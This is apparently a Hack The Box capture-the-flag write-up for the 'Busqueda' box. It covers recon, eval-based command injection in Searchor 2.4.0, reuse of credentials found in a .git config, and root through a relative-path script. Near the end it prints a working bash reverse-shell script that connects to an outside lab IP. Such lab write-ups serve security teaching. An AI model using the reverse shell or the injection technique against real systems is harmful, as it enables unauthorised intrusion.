---
title: "The Path to Root: Hijacking the Search on HTB 'Busqueda'"
seo_title: "Hack The Box 'Busqueda' Write-up: A Step-by-Step Guide"
date: 2025-11-30
layout: single
hideToc: false
tags: ['easy','linux','hackthebox','web']
summary: "Easy rated linux box 'Busqueda' from hackthebox comprising of command injection for foothold, credentials reuse for internal subdomain and insecure code executing a relative path script as root leading to privilege escalation."
---
<!--more-->

# Box Info

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled.png)

# Recon

## nmap

```jsx
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Website TCP 80

### Found searchor 2.4.0

The website had a feature of redirecting requests based on query and search engine provided.

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%201.png)

A brief look at the source of webpage tells us that it was using the **`version 2.4.0`** of the Seachor repository by ArjunSharda. It is a python based library which would give rediretable links based on queries for many search engines like amazon,google,etc.

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%202.png)

### Security Vulnerability patched in 2.4.2

We decided to have a look at the releases and source code for finding any vulnerable points.

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%203.png)

So there does seem to be something vulnerable which was not patched in `version 2.4.0`. Looking at the patch we can see that there is a vulnerable **`eval`** function used for processing the engine and query parameter which were being sent as post requests to the webserver.

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%204.png)

## Testing for Command Injection

To test for command injection, we fired up Burp and intercepted the requests. The requests were sent with `engine` and `query` parameters as POST parameters for further processing.

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%205.png)

Earlier, we observed that the code uses the `eval` function to process the query and engine. There are two potential attack points: the `engine` and `query` parameters. The `engine` parameter is used as a key for a dictionary of engines and their respective URLs. However, getting any response from the server using this parameter was difficult, as it did not return any response.

After trying the `query` parameter, we received favorable responses.

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%206.png)

The source code indicates that the query is being used as an argument to a function. We can successfully inject code by closing the function arguments and commenting out the rest of the arguments with `’)`. We know that multiple statements can be processed by `eval` with a delimiter of `“,”` and commenting out the rest of the code with `#` .

We tried injecting the `“id”` command and received a response indicating that the user is **svc**.

## Reverse Shell as `svc`

Now we can try a reverse shell.

We will host a malicious bash script on `port 8000` and inject the payload as follows:

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%207.png)

I got a **reverse shell** as **svc user** in the **/var/app/www** directory.

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%208.png)

### Hardcoded Credentials for `Cody`

Upon inspecting the existing directory, a `.git` folder was found with a `config` file containing credentials for user `Cody` with the subdomain of `gitea.searcher.htb`.

After conducting basic enumeration, two `Docker` instances were discovered to be running - one hosting the subdomain, and the other being a `MySQL` server.

This box had multiple instances of password reuse, with the password for `Cody` also being the password for the system user "`svc`".

The command "`sudo -l`" was tried to determine if any commands could be run as root.

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%209.png)

We can navigate to the /opt folder to find multiple scripts but no read access for regular user so we cant exploit it

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%2010.png)

There also seems to be a .git folder here which was a hint that these scripts were also in some repository.

### Subdomain gitea.searcher.htb

We attempted to determine if these were stored within a private repository belonging to user cody.

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%2011.png)

We checked user cody and it had the web server files for the searcher.htb website which was used for gaining foothold.

We can move on to executing the system-checkup.py for enumeration of dockers.

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%2012.png)

We can see two Docker instances with names suggesting one is the Gitea subdomain host and the other is for storing data in MySQL.

When we logged into the MySQL server, we found hashed passwords for the administrator and Cody. Breaking the passwords was an option, but there were also cron scripts resetting the passwords, so that wasn't the intended way. Another option was to edit the passwords ourselves with our own hashed passwords.

### Password reuse of administrator at gitea.searcher.htb as gitea_db_passwd

We attempted to log in as the administrator using the gitea database password, and it worked! We were able to access a private repository with scripts inside the opt directory.

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%2013.png)

During our enumeration, we ran `system-checkup.py` with the options **docker-ps**, **docker-inspect**, and **full-checkup**. However, the `full-checkup` command produced a vague "Something went wrong" output. This could potentially indicate a privilege escalation vulnerability in the attack vector.

Upon inspecting the source code, it appears that the `full-checkup` option executes any bash script with the name `full-checkup.sh` in the current working directory.

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%2014.png)

## Running Shell as Root

I created a `full-checkup.sh` script and learned an important lesson about using shebangs. Without it, the script would not execute properly.

```jsx
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.64/9001 0>&1
```

![Untitled](Busqueda%206c3aaf02c2034a228cbbc1e31a263ed0/Untitled%2015.png)